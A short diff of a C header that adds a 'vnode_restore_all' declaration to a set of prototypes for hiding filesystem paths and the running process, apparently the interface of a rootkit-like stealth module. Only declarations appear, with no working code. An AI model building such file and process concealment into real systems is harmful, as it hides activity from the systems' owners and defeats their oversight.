@@ -8,6 +8,7 @@
 int  vnode_hide_init(void);
 int  vnode_hide_path(const char *path);
 int  vnode_hide_all(void);
+int  vnode_restore_all(void);
 int  vnode_hide_cleanup(void);
 
 int  proc_hide_self(void);
